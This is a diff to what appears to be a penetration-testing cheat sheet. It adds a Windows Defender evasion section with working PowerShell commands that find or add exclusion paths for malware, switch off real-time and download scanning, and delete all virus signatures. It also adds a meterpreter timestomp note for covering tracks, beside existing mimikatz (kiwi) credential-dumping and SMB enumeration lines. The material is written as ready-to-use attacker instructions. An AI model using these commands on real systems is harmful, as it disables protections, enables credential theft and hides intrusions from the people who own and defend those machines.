@@ -181,9 +181,6 @@ nmap> !sh
 
 ENUMERATION
 ------------------------------------------------------------------------------------------------------------------------
-
-
-
 use
 enum4linux -a IPADDRESS
 to enumerate users and possibly passwords on machines that have smb open
@@ -191,6 +188,41 @@ to enumerate users and possibly passwords on machines that have smb open
 
 
 
+
+
+
+
+WINDOWS DEFENDER BYPASS
+-----------------------------------------------------------------------------------------------------------------------
+Windows Defender evasion
+Note: All below commands require administrative privileges on the system!
+
+You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!
+
+Get-MpPreference | select-object -ExpandProperty ExclusionPath
+
+
+Alternatively, you could add an exclusion directory for your shady stuff. 👀
+
+Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"
+
+
+
+If you’re more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩
+
+# Disable realtime monitoring altogether
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+# Only disables scanning for downloaded files or attachments
+
+Set-MpPreference -DisableIOAVProtection $true
+
+
+As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.
+
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
 
 
@@ -385,6 +417,7 @@ To find subdomains when pentesting,
 load powershell		#load powershell module into meterpreter
 load kiwi		#load mimikatz into meterpreter
 creds_all		#command to dump all credentails after loading kiwi
+timestomp		#use this to hide or mimic access and creation time of a file. This further covers your tracks. the '-v' options shows the MACE of a file '-f' mimics timestamp of another file #timestomp your_file -f file_to_mimic# and '-b' clanks the timestamp
 
 run post/multi/recon/local_exploit_suggester		#background the meterpreter session and run this for privilege escalation. It uses WinPEAS.
 
